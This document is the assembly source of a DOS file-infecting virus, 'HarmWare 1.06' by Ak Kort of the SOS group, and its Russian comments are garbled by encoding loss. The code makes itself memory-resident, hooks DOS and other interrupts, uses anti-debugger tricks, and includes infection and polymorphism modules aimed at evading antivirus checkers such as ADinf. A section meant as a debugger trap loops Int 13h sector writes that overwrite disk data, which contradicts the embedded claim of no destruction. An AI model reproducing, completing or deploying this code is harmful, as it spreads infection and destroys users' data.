;
;	HarmWare 1.06 by Ak Kort [SOS group]
;
;	�᭮���� ⥫� �����. �믮������ �ࠧ� ��᫥ �������䭮��
;	�������.
;

    page 0,255
    .model small
    .code

;include msg.inc

VirusSize	= (EndVirus_2-BeginVirus +15)/16	
;start1		= (((EndVirus-BeginVirus)+451)/16)
StartFile	= 3840;start1*16		; ����, ��㤠 ��稭����� ��娢

	@CallInt21	MACRO 		; �맮� ��ண� Int 21
	  call Old21
	ENDM
		
    assume ds:_TEXT,es:_TEXT,ss:_TEXT
BeginVirus:
	mov sp,es	; �� SP � ES ��࠭﫨
	push cx		; ��᫥ LOOP'� CX=0

	mov ax,ds	; ���� �㦭� ������ DS, � �� CS, ⠪ ��� ���
	dec ax		; EXE DS<>CS
	
	mov es,ax	; ����砥� ᥣ���� ᮡ�⢥����� MCB

	mov bx,es:[3]	; �����蠥� ࠧ��� ����� ⠪, �⮡� ��⠫���
	push ds		; ���� ��� ����� � ⠡���� �ਢ燐�
	pop es
	sub bx,VirusSize+1	; (� �� 16 ���� �� MCB)
	mov ah,4Ah
	int 21h
	

	mov ax,5800h	; �뤥�塞 ������ (����⥫쭮 � UMB) ��� �����
	int 21h
	push ax
	mov ax,5802h
	int 21h
	push ax
	mov si,sp
	mov bx,1
	mov ax,5803h
	int 21h
	mov bx,82h
	mov ax,5801h
	int 21h
AfterInt:
	mov si,cs:[si-6]	;����砥� ���� ��⪨ AfterInt
	mov ah,48h
	mov bx,VirusSize
	int 21h			;�뤥���� ����
	mov es,ax
	pop cx
	pop bx
	mov ax,5801h
	int 21h	
	mov bl,cl
	mov ax,5803h
	int 21h
; ����⠭����� ���⥣��

	pop ds		;�� � �⥪ ����㫨 CX=0 (�ࠧ� ��᫥ LOOP'�)
	
	mov ds:[4],offset EnterPoint	;����ன�� ��ࠡ��稪� Int 1
	mov ds:[6],es

	mov ds:[12],offset New_03	;� �� �������
	mov ds:[14],es
;--------------------------- �᫨ �����������, ������ � ��樥� /NOCODE

;����뫪� ����� � ����� ����
	push cs
	pop ds
	sub si,AfterInt-BeginVirus
	xor di,di
	mov cx,(EndVirus-BeginVirus+1)/2
	cld
	rep movsw

	push es		;�����砥� �⥪ �� १������� ����
	pop ss
	lea sp,stack

	pushf
	mov si,sp		;����砥� ०�� ��蠣����� �믮������
	pushf			;���� ��楤��� ��ࠡ�⪨ Int 1 - ����
	inc byte ptr es:[si-1]	;१����⭮� ��� �����
	popf
	popf		; �� :) ������ �⫠�稪� �� ��㫨���� int 1 �����
			; ���� popf :)

;push es			;����� १����� - ��⮬ 㡥��
;mov bx,offset EnterPoint
;push bx
;retf

;�� ���� �㤥� �믮������ ⮫쪮 � ��砥 ��蠣����� �믮������
;mov ah,4Ch	;� ���� �� �����������
;int 21h
;------------------- �祭� ���᭠� ���� !
;			  --  ��⠭���� 㪠��⥫� Int 8 �� Int 26  --
;			�१ ����� 1/18.2 ᥪ㭤� ��뢠���� Int 26 �
;			��砩�묨 ���祭�ﬨ !
;
;			�������. ���-�� ������� �� �� ������ ᥪ�஢...
;
	mov cx,0101
@@1:	mov ax,03FFh
	mov dx,080h
	int 13h
	add ch,1
	adc dh,0
	jmp @@1

;------------------------ �� ���㬠� ����᪠�� !

EnterPoint:	;� ��室�� �� Int 1. ���, �� �� 㦥 � ��㣮� ᥣ����
	
	mov ax,offset Change_MCB
	push ax
	
Start_Of_Code_d:
	byte 0,0,0,0,0
	mov cs:FileSeg,ds	;DS = CS ����㦥��� �ணࠬ��
	push cs
	pop ds
	
;NextCheck:
	mov ax,1E02h	;�஢�ઠ ������⢨� १�����
	int 21h		;�㭪�� 1E �⠭���⭮ �����頥� AX=1E00
	cmp ax,021Eh
	jz AlreadyLoaded
	mov cl,82h
	shr ax,cl
	jz AlreadyLoaded	; ������ ���� 386. ����୮� �� �⎨�...
	xor ax,ax
	push ax
	int 1Ah				; ���樠�����㥬 ������� ��砩���
	mov word ptr ds:Old_Rnd,dx	; �ᥫ �� ⠩����.
	pop ds
	;
	; ������ ��� ���� �஢���� - �᫨ �� ��室���� � UMB, � �����
	; ������� १����⮬ ��אַ ���, ���� - �����뢠�� ����� �� ����
	; �ணࠬ��, ��⠢�塞 ��� १������ � �믮��塞 ������
	; ����� �ணࠬ��. �� ��� ������ � ᥣ���� ���㦥���.
	;
	mov ax,cs
	cmp ax,0c800h
	jc Not_In_UMB
	
	call NewInts	
	mov dx,8		; ���� �������� �����
	mov bx,'CS'		; �������� �����
	retn
Not_In_UMB:
	mov dx,1
	retn
AlreadyLoaded:	
	xor dx,dx		; ���� �������� = 0 - ���� ᢮�����
	retn
	
;
; �������� ᠬ�४���� ;-)
;

My_Name	byte 13,10,13,10,9,9,'    - HarmWare v1.06 by Ak Kort [SOS group] -',13,10
	byte 9,9,"Hi! I'm still alive :) Let me introduce my new release.",13,10
	byte 9,'  There are none distruction. Just another way of anti-heuristic...',13,10,13,10,36

End_Of_Code_d:

NewInts:
	call Remove_Guard
	lea dx, New_21
	lea di, Old_21
	mov bx,84h
	call ChangeInt
	
;	mov dx,offset New_08	; � ��� � ⠩���
;	mov di,offset Old_08
;	mov bx,8*4
;	call ChangeInt
	call TestPricol
;	mov cs:under_1f,0	; �ਧ��� ࠡ��� ��-��� Adinf
	retn
	
Change_MCB:
	cmp dx,1	; dx=1 �᫨ �ॡ���� १����⭮��� � LowMem
	jz LowMemRes
	mov ax,cs
	dec ax
	mov ds,ax
	mov word ptr ds:[1],dx	; ��⠭�������� MCB ��� ����
	mov word ptr ds:[8],bx
	mov bx,cs:FileSeg	; ��६ ᥣ���� �ணࠬ��
	test cs:Exe_Flag,1
	jz @DecodeCom
	sub bx,16
@DecodeCom:
	mov ds,bx	; �믮��塞 �ᯠ�����
	mov es,bx
byte 0B9h	;mov cx,PackedLen
PackedLen	word 507

byte 0BEh	;mov si,ArcStart
ArcStart word Here_You_Are + 5+100h

	delta equ 6
	
	mov di,100h-delta
	push word ptr [di]
	push word ptr [di+2]
	push word ptr [di+4]
;	push word ptr [di+6]
;	push word ptr [di+8]
;	push word ptr [di+10]
;	push word ptr [di+12]
;	push word ptr [di+14]
	push di

	mov ax,offset End_Of_Code_e
	push ax
		
	push cx
	rep movsb
	xchg ax,cx
	pop cx
	mov si,cx
	add si,100h-delta-1		;si=PakedLen+0F9h

byte 0BFh	;mov di,FileLen+256
FileLen_x word 4615+256
;	dec si
	dec di
byte 0B2h	;mov dl,CodeByte
CodeByte byte 255


Start_Of_Code_e:		; �� ������� ������஢���. ����� ���
	byte 0,0,0,0,0		; ����᮫��� ���������
	
	std			; �� ������ ��娢�樨 ᬮ��� � lzss.inc
@303:
	lodsb
	cmp al,dl
	jnz @302
	dec cx
	lodsb
	or al,al
	jnz @301
	mov al,dl
@302:	stosb
	jmp short @300
@301:	dec cx
	push cx
	 mov cx,ax
	 lodsb
	 push si
	  mov si,di
	  add si,ax
	  rep movsb
	 pop si
	pop cx
@300:	loop @303
	
	retn
	nop
End_Of_Code_e:

	cld
	pop di
;	pop word ptr [di+14]
;	pop word ptr [di+12]
;	pop word ptr [di+10]
;	pop word ptr [di+8]
;	pop word ptr [di+6]
	pop word ptr [di+4]
	pop word ptr [di+2]
	pop word ptr [di]
				; �ᯠ������. �㤭�.
	test cs:Exe_Flag,1	; ������ ����᪠��
	jz Im_Com
	add bx,10h
	byte 0B8h	;mov ax,
Old_ss	word 0
	add ax,bx
	mov ss,ax
	byte 0BCh	;mov sp,
Old_sp	word 0
	byte 81h,0C3h	;add bx,
Old_cs	word 0
	push bx
	byte 0B8h	;mov ax,
Old_ip	word 0
	jmp short Start_Infected
Im_Com:
	dec bx
	mov ds,bx
	inc bx
	mov ax,ds:[3]
	push es
	pop ds
	mov ss,bx
	mov sp,-2
	cmp ax,4096
	jnc @imc1
	add ax,ax
	add ax,ax
	add ax,ax
	add ax,ax
	dec ax
	and ax,-2
	mov sp,ax
@imc1:
	push cx
	push bx
	mov ax,256
Start_Infected:			; �������� ��஦��
	push ax
	sti
	retf
.386

;include debug.inc
include lowmem.inc
include lzss.inc
include infect.inc
include morph.inc
include anti_-d.inc
include int21.inc
include exepack.inc
;include adinf.inc
include pricol.inc

Exe_Flag	byte 0	; ���� �����뢠�� ⨯ 䠩��: 0-COM 1-EXE
CHKLIST_1	byte 'chklist.ms',0
CHKLIST_2	byte 'chklist.cps',0

EndVirus:

Old_Rnd		byte 0
Old_Rnd_Low	byte 0
FileSeg		word 0
Old_Dta		word 0,0
Relo_Seg	word 0
Old_03		word 0,0
Old_24		word 0,0
No_Any_Key	word 0
TimeBomb	word 0
;under_1f	byte 0
_trash		word 0

ExecParam:

write_pos	equ dword ptr [$]
write_pos_l	word 0
write_pos_h	word 0

read_pos	equ dword ptr [$]
read_pos_l	word 0
read_pos_h	word 0

FileNum		word 0

FileLen_l	word 0
FileLen_h	word 0

AllLen_l	word 0
AllLen_h	word 0
HeadLen		word 0


int21sp		word 0
int21ss		word 0

ProgName:

nam_dx		word 0
nam_ds		word 0
old_ax		word 0
old_bx		word 0
old_cx		word 0
old_dx		word 0
old_di		word 0
old_si		word 0
old_ds		word 0
Code_Offset	word 0
Coded_Arrea_Offset	word 0
Len_Offset	word 0
Offset_Offset	word 0
Inc_Value	word 0

file_dx		word 0
file_ds		word 0
file_date	word 0
file_time	word 0

New_Dta		byte 15h dup (0)
Dta_Attr	byte 0
Dta_Time	word 0
Dta_Date	word 0
Dta_Size	word 0,0
Dta_Name	byte '?????????????'

Header_ID	word 0
Header_Last	word 0
Header_Pages	word 0
Header_Relocs	word 0
Header_Len	word 0
Header_Minumum	word 0
Header_Maximum	word 0
Header_SS	word 0
Header_SP	word 0
Header_CheckSum	word 0
Header_IP	word 0
Header_CS	word 0
Header_ReloAdr	word 0
Header_Overlay	word 0
RealSeg	word 0

	byte 256 dup(0)	
	
stack equ $-2

EndVirus_2:

Here_You_Are:		; �� �������� ��ࠦ����� �ணࠬ��
	include today.inc
END
